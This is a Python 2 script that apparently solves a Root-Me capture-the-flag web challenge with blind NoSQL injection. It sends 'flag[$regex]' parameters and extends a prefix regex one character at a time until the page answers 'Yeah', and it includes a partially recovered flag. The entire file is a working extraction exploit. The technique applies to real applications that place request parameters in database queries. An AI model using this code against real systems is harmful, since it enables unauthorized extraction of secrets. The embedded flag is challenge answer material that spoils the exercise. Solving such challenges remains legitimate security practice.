import urllib
import requests
import tqdm
import string



url = 'http://challenge01.root-me.org/web-serveur/ch48/index.php'

table = string.digits + string.letters + '\\'.join(list('!@#$%^&*()_+{}:"<>?-=[];\',./'))

print 'table: ' + table

ch = ''
flags = '3@sY_n0_5q7_1nj3c710n'
flag_find = 0
while True:
    for x in table:
        if x == '\\':
            ch = '\\'
            continue
        x = ch+x
        ch = ''
        payload = '^' + flags + x +'.*'
        print 'payload : ' + payload
        params = {'chall_name' : 'nosqlblind', 'flag[$regex]' : payload}
        '''
        temp=url+'?chall_name=nosqlblind&flag[$regex]=^'+urllib.quote_plus('^' + flags + payload)
        res = requests.get(temp)
        '''
        res = requests.get(url, params = params)
        if res.text.find('Yeah') != -1:
            print 'Found flags ::: ' + x
            flags += x.replace('\\', '')
            flag_find = 1
            break
    if flag_find != 1:
        break
    flag_find = 0

print 'flags: ' + flags
    




